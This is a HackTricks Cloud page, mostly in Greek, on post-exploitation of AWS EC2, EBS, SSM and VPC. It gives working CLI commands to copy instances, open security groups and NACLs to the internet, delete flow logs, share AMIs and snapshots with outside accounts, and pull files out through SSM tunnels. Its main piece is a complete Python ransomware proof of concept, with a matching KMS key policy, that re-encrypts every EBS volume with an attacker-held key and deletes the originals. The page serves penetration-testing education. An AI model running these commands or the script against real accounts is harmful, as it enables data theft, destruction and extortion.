# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **αντιγράφει την εισερχόμενη και εξερχόμενη κίνηση για EC2 instances εντός ενός VPC** χωρίς την ανάγκη να εγκατασταθεί οτιδήποτε στα ίδια τα instances. Αυτή η αντιγραμμένη κίνηση συνήθως αποστέλλεται σε κάτι σαν σύστημα ανίχνευσης εισβολών δικτύου (IDS) για ανάλυση και παρακολούθηση.\
Ένας attacker θα μπορούσε να το καταχραστεί για να καταγράψει όλη την κίνηση και να αποκτήσει ευαίσθητες πληροφορίες από αυτή:

Για περισσότερες πληροφορίες δείτε αυτή τη σελίδα:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances usually contain some kind of sensitive information. There are different ways to get inside (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). However, another way to check what it contains is to **create an AMI and run a new instance (even in your own account) from it**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots είναι αντίγραφα ασφαλείας των volumes**, τα οποία συνήθως θα περιέχουν **ευαίσθητες πληροφορίες**, επομένως ο έλεγχός τους θα πρέπει να αποκαλύψει αυτές τις πληροφορίες.\
Αν βρείτε ένα **volume χωρίς snapshot** μπορείτε να: **δημιουργήσετε ένα snapshot** και να εκτελέσετε τις παρακάτω ενέργειες ή απλά **να το mountάρετε σε ένα instance** εντός του account:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Εξάγετε ένα EC2 AMI απευθείας σε S3 χρησιμοποιώντας `CreateStoreImageTask` για να αποκτήσετε μια raw εικόνα δίσκου χωρίς κοινή χρήση snapshot. Αυτό επιτρέπει πλήρη offline forensics ή κλοπή δεδομένων αφήνοντας το networking του instance αμετάβλητο.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Συνδέστε ένα io1/io2 Multi-Attach volume σε δεύτερο instance και προσαρτήστε το σε read-only για να αναρροφήσετε ζωντανά δεδομένα χωρίς snapshots. Χρήσιμο όταν το victim volume έχει ήδη ενεργοποιημένο Multi-Attach στην ίδια AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Δημιουργήστε ένα EC2 Instance Connect Endpoint, εξουσιοδοτήστε ingress και εγχύστε ephemeral SSH keys για πρόσβαση σε private instances μέσω ενός managed tunnel. Παρέχει γρήγορους δρόμους για lateral movement χωρίς να ανοίγουν public ports.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Μετακινήστε τη δευτερεύουσα private IP ενός victim ENI σε ένα ENI που ελέγχεται από τον attacker για να μιμηθείτε trusted hosts που είναι allowlisted κατά IP. Επιτρέπει την παράκαμψη εσωτερικών ACLs ή SG κανόνων που βασίζονται σε συγκεκριμένες διευθύνσεις.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Επανασυνδέστε ένα Elastic IP από το victim instance στον attacker για να παρεμβληθείτε στο inbound traffic ή να εγκαινιάσετε outbound συνδέσεις που φαίνεται να προέρχονται από trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Αν ένας κανόνας security group αναφέρεται σε μια customer-managed prefix list, η προσθήκη attacker CIDRs στη λίστα διευρύνει σιωπηρά την πρόσβαση σε κάθε εξαρτώμενο SG κανόνα χωρίς να τροποποιηθεί το ίδιο το SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Δημιουργήστε gateway ή interface VPC endpoints για να ανακτήσετε outbound access από απομονωμένα subnets. Η αξιοποίηση AWS-managed private links παρακάμπτει τα απουσιάζοντα IGW/NAT controls για data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Ένας attacker με το permission `ec2:AuthorizeSecurityGroupIngress` μπορεί να προσθέσει inbound κανόνες σε security groups (για παράδειγμα, επιτρέποντας `tcp:80` από `0.0.0.0/0`), εκθέτοντας έτσι εσωτερικές υπηρεσίες στο public Internet ή σε μη εξουσιοδοτημένα δίκτυα.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Ένας επιτιθέμενος με δικαιώματα ec2:ReplaceNetworkAclEntry (ή παρόμοια) μπορεί να τροποποιήσει τα Network ACLs (NACLs) ενός subnet ώστε να τα κάνει πολύ πιο επιτρεπτικά — για παράδειγμα επιτρέποντας 0.0.0.0/0 σε κρίσιμες θύρες — εκθέτοντας ολόκληρο το εύρος του subnet στο Internet ή σε μη εξουσιοδοτημένα τμήματα δικτύου. Σε αντίθεση με τα Security Groups, που εφαρμόζονται ανά instance, τα NACLs εφαρμόζονται σε επίπεδο subnet, οπότε η αλλαγή ενός περιοριστικού NACL μπορεί να έχει πολύ μεγαλύτερη έκταση αντίκτυπου επιτρέποντας πρόσβαση σε πολλούς περισσότερους hosts.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Ένας επιτιθέμενος με δικαιώματα ec2:Delete* και iam:Remove* μπορεί να διαγράψει κρίσιμους πόρους υποδομής και ρυθμίσεις — για παράδειγμα key pairs, launch templates/versions, AMIs/snapshots, volumes ή attachments, ομάδες ασφάλειας ή κανόνες, ENIs/network endpoints, route tables, gateways ή managed endpoints. Αυτό μπορεί να προκαλέσει άμεση διακοπή υπηρεσίας, απώλεια δεδομένων και απώλεια τεκμηρίων.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Κατευθύνετε τα VPC Flow Logs σε έναν S3 bucket που ελέγχεται από επιτιθέμενο για να συλλέγετε συνεχώς μεταδεδομένα δικτύου (πηγή/προορισμός, θύρες) έξω από τον λογαριασμό του θύματος για μακροχρόνια αναγνώριση.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Ακόμα κι αν περιορίσετε ένα EC2 ώστε να μην βγαίνει κίνηση, μπορεί ακόμα να **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- You have no access to AWS DNS logs.
- Disable this by setting "enableDnsSupport" to false with:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Ένας επιτιθέμενος μπορεί να καλεί API endpoints ενός λογαριασμού που ελέγχει. Το Cloudtrail θα καταγράψει αυτές τις κλήσεις και ο επιτιθέμενος θα μπορεί να δει τα exfiltrate δεδομένα στα Cloudtrail logs.

### Open Security Group

Μπορείτε να αποκτήσετε περαιτέρω πρόσβαση σε υπηρεσίες δικτύου ανοίγοντας θύρες όπως παρακάτω:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Είναι δυνατό να τρέξετε ένα EC2 instance και να το καταχωρήσετε για να χρησιμοποιηθεί για την εκτέλεση ECS instances και στη συνέχεια να κλέψετε τα δεδομένα των ECS instances.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Απαιτούμενα δικαιώματα:

- `ssm:StartSession`

Εκτός από την εκτέλεση εντολών, το SSM επιτρέπει το traffic tunneling το οποίο μπορεί να καταχραστεί για να γίνει pivot από EC2 instances που δεν έχουν πρόσβαση στο δίκτυο λόγω Security Groups ή NACLs.
Ένα από τα σενάρια όπου αυτό είναι χρήσιμο είναι το pivoting από ένα [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) σε ένα ιδιωτικό EKS cluster.

> Για να ξεκινήσετε μια συνεδρία χρειάζεστε εγκατεστημένο το SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Εγκαταστήστε το SessionManagerPlugin στον υπολογιστή σας
2. Συνδεθείτε στο Bastion EC2 χρησιμοποιώντας την ακόλουθη εντολή:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Αποκτήστε τα προσωρινά AWS διαπιστευτήρια του Bastion EC2 με το [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script
4. Μεταφέρετε τα διαπιστευτήρια στον δικό σας υπολογιστή στο αρχείο `$HOME/.aws/credentials` ως προφίλ `[bastion-ec2]`
5. Συνδεθείτε στο EKS ως το Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Ενημερώστε το πεδίο `server` στο αρχείο `$HOME/.kube/config` ώστε να δείχνει στο `https://localhost`
7. Δημιουργήστε ένα SSM tunnel ως εξής:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Η κυκλοφορία από το εργαλείο `kubectl` προωθείται τώρα μέσω του SSM tunnel που διέρχεται από το Bastion EC2 και μπορείτε να αποκτήσετε πρόσβαση στο ιδιωτικό EKS cluster από τον δικό σας υπολογιστή εκτελώντας:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Σημειώστε ότι οι συνδέσεις SSL θα αποτύχουν εκτός αν ορίσετε τη σημαία `--insecure-skip-tls-verify ` (ή το ισοδύναμό της σε εργαλεία audit του K8s). Δεδομένου ότι η κίνηση διέρχεται μέσω του ασφαλούς AWS SSM tunnel, είστε ασφαλείς από οποιοδήποτε είδος MitM attacks.

Τέλος, αυτή η τεχνική δεν είναι ειδική για επιθέσεις σε private EKS clusters. Μπορείτε να ορίσετε αυθαίρετα domains και ports για να κάνετε pivot σε οποιαδήποτε άλλη AWS υπηρεσία ή σε μια προσαρμοσμένη εφαρμογή.

---

#### Γρήγορη τοπική ↔️ απομακρυσμένη Port Forward (AWS-StartPortForwardingSession)

Αν χρειάζεστε μόνο να προωθήσετε **ένα TCP port από το EC2 instance προς το local host** μπορείτε να χρησιμοποιήσετε το SSM document `AWS-StartPortForwardingSession` (δεν απαιτείται παράμετρος remote host):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Η εντολή δημιουργεί ένα αμφίδρομο tunnel μεταξύ του υπολογιστή εργασίας σας (`localPortNumber`) και της επιλεγμένης θύρας (`portNumber`) στο instance **without opening any inbound Security-Group rules**.

Common use cases:

* **File exfiltration**
1. Στο instance ξεκινήστε έναν γρήγορο HTTP server που εξυπηρετεί τον κατάλογο που θέλετε να exfiltrate:

```bash
python3 -m http.server 8000
```

2. Από τον υπολογιστή εργασίας σας ανακτήστε τα αρχεία μέσω του SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Πρόσβαση σε εσωτερικές web εφαρμογές (π.χ. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Συμβουλή: Συμπιέστε και κρυπτογραφήστε τα αποδεικτικά στοιχεία πριν τα εξαγάγετε, ώστε το CloudTrail να μην καταγράφει το περιεχόμενο σε απλό κείμενο:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Κοινή χρήση AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Αναζήτηση ευαίσθητων πληροφοριών σε δημόσια και ιδιωτικά AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): Το CloudShovel είναι ένα εργαλείο σχεδιασμένο για να **αναζητά ευαίσθητες πληροφορίες σε δημόσια ή ιδιωτικά Amazon Machine Images (AMIs)**. Αυτοματοποιεί τη διαδικασία εκκίνησης instances από τις στοχευόμενες AMIs, το mounting των volumes τους και τη σάρωση για πιθανά secrets ή ευαίσθητα δεδομένα.

### Κοινοποίηση EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Μια απόδειξη εννοιολογίας παρόμοια με την επίδειξη Ransomware που παρουσιάστηκε στις S3 post-exploitation σημειώσεις. Το KMS θα έπρεπε να μετονομαστεί σε RMS για Ransomware Management Service, λόγω του πόσο εύκολα μπορεί να χρησιμοποιηθεί για την κρυπτογράφηση διαφόρων AWS υπηρεσιών που το χρησιμοποιούν.

Αρχικά, από έναν 'attacker' AWS account, δημιουργήστε ένα customer managed key στο KMS. Για αυτό το παράδειγμα θα αφήσουμε την AWS να διαχειριστεί τα δεδομένα του key για εμάς, αλλά σε ένα ρεαλιστικό σενάριο ένας malicious actor θα διατηρούσε τα δεδομένα του key έξω από τον έλεγχο της AWS. Αλλάξτε την key policy ώστε να επιτρέπει σε οποιονδήποτε AWS account Principal να χρησιμοποιήσει το key. Για αυτή την key policy, το όνομα του λογαριασμού ήταν 'AttackSim' και ο κανόνας πολιτικής που επιτρέπει πλήρη πρόσβαση ονομάζεται 'Outside Encryption'.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Ο κανόνας της key policy πρέπει να έχει ενεργοποιημένα τα εξής για να επιτρέπεται η χρήση του για κρυπτογράφηση ενός EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Παρόμοια με το παράδειγμα ransomware στο S3. Αυτή η επίθεση θα δημιουργήσει αντίγραφα των συνδεδεμένων EBS volumes χρησιμοποιώντας snapshots, θα χρησιμοποιήσει το δημόσια διαθέσιμο key από τον λογαριασμό 'attacker' για να κρυπτογραφήσει τα νέα EBS volumes, έπειτα θα αποσυνδέσει τα αρχικά EBS volumes από τα EC2 instances και θα τα διαγράψει, και τέλος θα διαγράψει τα snapshots που χρησιμοποιήθηκαν για τη δημιουργία των νεοκρυπτογραφημένων EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Αποτέλεσμα είναι να παραμένουν διαθέσιμα στον λογαριασμό μόνο κρυπτογραφημένα EBS volumes.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Αξίζει επίσης να σημειωθεί ότι το script σταμάτησε τα EC2 instances για να αποσυνδέσει και να διαγράψει τα αρχικά EBS volumes. Τα αρχικά, μη κρυπτογραφημένα volumes έχουν πλέον χαθεί.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Στη συνέχεια, επιστρέψτε στην key policy στον λογαριασμό 'attacker' και αφαιρέστε τον κανόνα πολιτικής 'Outside Encryption' από την key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Περιμένετε λίγο ώστε η νέα key policy να διαδοθεί. Στη συνέχεια επιστρέψτε στον λογαριασμό 'victim' και προσπαθήστε να επισυνάψετε έναν από τους πρόσφατα κρυπτογραφημένους EBS volumes. Θα διαπιστώσετε ότι μπορείτε να επισυνάψετε τον volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Αλλά όταν προσπαθήσετε πραγματικά να ξεκινήσετε ξανά το EC2 instance με τον κρυπτογραφημένο EBS volume, αυτό θα αποτύχει και θα περνάει από την κατάσταση 'pending' πίσω στην κατάσταση 'stopped' για πάντα, επειδή ο επισυναπτόμενος EBS volume δεν μπορεί να αποκρυπτογραφηθεί με το key, καθώς η key policy πλέον δεν το επιτρέπει.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Αυτό είναι το python script που χρησιμοποιήθηκε. Παίρνει AWS creds για έναν 'victim' account και μια δημόσια διαθέσιμη AWS ARN τιμή για το key που θα χρησιμοποιηθεί για την κρυπτογράφηση. Το script θα δημιουργήσει κρυπτογραφημένα αντίγραφα ΟΛΩΝ των διαθέσιμων EBS volumes που είναι συνδεδεμένα σε ΟΛΑ τα EC2 instances στον στοχευμένο AWS account, στη συνέχεια θα σταματήσει κάθε EC2 instance, θα αποσυνδέσει τα αρχικά EBS volumes, θα τα διαγράψει και τελικά θα διαγράψει όλα τα snapshots που χρησιμοποιήθηκαν κατά τη διαδικασία. Αυτό θα αφήσει μόνο κρυπτογραφημένους EBS volumes στον στοχευμένο 'victim' account. ΜΗ ΧΡΗΣΙΜΟΠΟΙΕΙΤΕ ΑΥΤΟ ΤΟ SCRIPT ΠΑΡΑΜΟΝΟ ΣΕ ΠΕΡΙΒΑΛΛΟΝ ΔΟΚΙΜΩΝ — ΕΙΝΑΙ ΚΑΤΑΣΤΡΟΦΙΚΟ ΚΑΙ ΘΑ ΔΙΑΓΡΑΨΕΙ ΟΛΑ ΤΑ ΑΡΧΙΚΑ EBS VOLUMES. Μπορείτε να τα ανακτήσετε χρησιμοποιώντας το KMS key που χρησιμοποιήθηκε και να τα επαναφέρετε στην αρχική τους κατάσταση μέσω snapshots, αλλά θέλω να σας ενημερώσω ότι αυτό, στο τέλος της ημέρας, είναι ένα ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Αναφορές

- [Pentest Partners – Πώς να μεταφέρετε αρχεία στο AWS χρησιμοποιώντας SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
